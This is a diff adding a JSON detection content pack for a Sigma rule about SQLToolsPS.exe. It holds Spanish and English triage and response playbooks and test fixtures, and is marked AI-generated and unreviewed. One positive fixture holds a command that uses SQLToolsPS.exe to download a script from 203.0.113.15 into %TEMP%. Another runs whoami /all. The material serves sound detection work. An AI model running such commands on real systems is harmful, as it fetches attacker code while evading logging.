@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "a746c9b8-a2fb-4ee5-a428-92bee9e99060",
+    "title": "SQL Client Tools PowerShell Session Detection",
+    "level": "medium",
+    "status": "test",
+    "author": "Agro (@agro_sev) oscd.communitly",
+    "path": "windows/process_creation/proc_creation_win_mssql_sqltoolsps_susp_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mssql_sqltoolsps_susp_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001",
+      "T1127"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó SQLToolsPS.exe, el host de PowerShell de SQL Server Management Studio, o este binario lanzó un proceso hijo. Puede indicar ejecución de PowerShell que evita el registro de script blocks.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image u OriginalFileName corresponden a sqltoolsps.exe, o donde ParentImage termina en \\sqltoolsps.exe. Se excluyen los eventos cuyo ParentImage termina en \\smss.exe.",
+      "why_it_matters": "SQLToolsPS.exe es un binario firmado por Microsoft que ejecuta código PowerShell (T1059.001) sin generar logs de script blocks. Un atacante puede usarlo como proxy de ejecución confiable (T1127) para evadir controles basados en esos logs.",
+      "triage_steps": [
+        "Revise CommandLine de sqltoolsps.exe: busque -Command, -EncodedCommand, descargas (Invoke-WebRequest, DownloadString), IEX o rutas de scripts en carpetas temporales.",
+        "Confirme que Image esté en la ruta de instalación de SSMS y valide la firma y el hash; una copia en %TEMP%, Downloads o ProgramData es sospechosa.",
+        "Identifique ParentImage: un lanzamiento desde Office, wscript, mshta o cmd es más sospechoso que uno desde Ssms.exe.",
+        "Si sqltoolsps.exe es ParentImage, analice el proceso hijo y su CommandLine (cmd, whoami, net, rundll32, otro powershell).",
+        "Verifique si el usuario es DBA o desarrollador con SSMS instalado legítimamente en ese host.",
+        "Pivote en el mismo host ±15 minutos: conexiones de red, archivos creados, tareas programadas, servicios nuevos y cambios en el registro.",
+        "Busque alertas anteriores del mismo usuario y host, y ejecuciones de sqltoolsps.exe en otros endpoints."
+      ],
+      "false_positives": [
+        "Administradores de bases de datos que usan el módulo SQL PowerShell desde SSMS para tareas de mantenimiento.",
+        "Scripts de automatización o despliegue de SQL Server que invocan SQLToolsPS.exe de forma documentada.",
+        "Procesos hijos esperados (por ejemplo conhost.exe) cuando SSMS abre una sesión de PowerShell interactiva."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el equipo de bases de datos si la ejecución fue planificada.",
+        "Si no está justificada, aísle el endpoint y preserve memoria, el binario y los artefactos relacionados.",
+        "Termine los procesos maliciosos tras documentarlos, elimine la persistencia identificada y bloquee los indicadores encontrados.",
+        "Restablezca credenciales del usuario afectado si hubo descarga o ejecución de payloads, y considere restringir SQLToolsPS.exe con AppLocker o WDAC en equipos sin SSMS."
+      ],
+      "severity_rationale": "Media porque el uso directo es poco común y evade el registro de script blocks, pero SSMS es software legítimo y la intención debe confirmarse con el contexto."
+    },
+    "en": {
+      "summary": "SQLToolsPS.exe, the SQL Server Management Studio PowerShell host, was executed or spawned a child process. This may be PowerShell execution that avoids script block logging.",
+      "what_it_detects": "Windows process creation events where Image or OriginalFileName is sqltoolsps.exe, or where ParentImage ends with \\sqltoolsps.exe. Events whose ParentImage ends with \\smss.exe are excluded.",
+      "why_it_matters": "SQLToolsPS.exe is a Microsoft-signed binary that runs PowerShell code (T1059.001) without producing script block logs. Attackers can use it as a trusted developer-utility proxy (T1127) to evade log-based defenses.",
+      "triage_steps": [
+        "Review the sqltoolsps.exe CommandLine for -Command, -EncodedCommand, downloads (Invoke-WebRequest, DownloadString), IEX, or scripts in temporary folders.",
+        "Confirm Image is in the SSMS install path and validate signature and hash; a copy in %TEMP%, Downloads or ProgramData is suspicious.",
+        "Check ParentImage: launches from Office, wscript, mshta or cmd are more suspicious than from Ssms.exe.",
+        "If sqltoolsps.exe is the ParentImage, examine the child process and its CommandLine (cmd, whoami, net, rundll32, another powershell).",
+        "Verify whether the user is a DBA or developer with SSMS legitimately installed on that host.",
+        "Pivot on the same host +/- 15 minutes: network connections, dropped files, scheduled tasks, new services and registry changes.",
+        "Search earlier alerts for the same user and host, and sqltoolsps.exe executions on other endpoints."
+      ],
+      "false_positives": [
+        "Database administrators using the SQL PowerShell module from SSMS for maintenance tasks.",
+        "SQL Server automation or deployment scripts that invoke SQLToolsPS.exe in a documented way.",
+        "Expected child processes (for example conhost.exe) when SSMS opens an interactive PowerShell session."
+      ],
+      "response_steps": [
+        "Confirm with the user or database team whether the execution was planned.",
+        "If unjustified, isolate the endpoint and preserve memory, the binary and related artifacts.",
+        "After documenting them, terminate malicious processes, remove identified persistence and block discovered indicators.",
+        "Reset the affected user's credentials if payloads were downloaded or run, and consider restricting SQLToolsPS.exe via AppLocker or WDAC on hosts without SSMS."
+      ],
+      "severity_rationale": "Medium because direct use is uncommon and bypasses script block logging, yet SSMS is legitimate software and intent must be confirmed from context."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "SQLToolsPS.exe launched from cmd.exe running an inline PowerShell command",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 18\\Common7\\Tools\\Binn\\SQLToolsPS.exe",
+          "OriginalFileName": "SQLToolsPS.exe",
+          "CommandLine": "SQLToolsPS.exe -NoProfile -Command \"Invoke-WebRequest -Uri http://203.0.113.15/a.ps1 -OutFile $env:TEMP\\a.ps1\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start SQLToolsPS.exe",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Child process whoami.exe spawned by SQLToolsPS.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "OriginalFileName": "whoami.exe",
+          "CommandLine": "whoami.exe /all",
+          "ParentImage": "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 18\\Common7\\Tools\\Binn\\SQLToolsPS.exe",
+          "ParentCommandLine": "SQLToolsPS.exe -NoProfile -Command whoami /all",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "SQLToolsPS.exe whose parent is smss.exe, excluded by the filter",
+        "event": {
+          "EventID": 1,
+          "Computer": "SQL-01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 18\\Common7\\Tools\\Binn\\SQLToolsPS.exe",
+          "OriginalFileName": "SQLToolsPS.exe",
+          "CommandLine": "SQLToolsPS.exe",
+          "ParentImage": "C:\\Windows\\System32\\smss.exe",
+          "IntegrityLevel": "System"
+        }
+      },
+      {
+        "description": "Legacy sqlps.exe started by a DBA from SSMS; name does not end with sqltoolsps.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "SQL-01.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe",
+          "OriginalFileName": "sqlps.exe",
+          "CommandLine": "sqlps.exe -NoLogo",
+          "ParentImage": "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 18\\Common7\\IDE\\Ssms.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
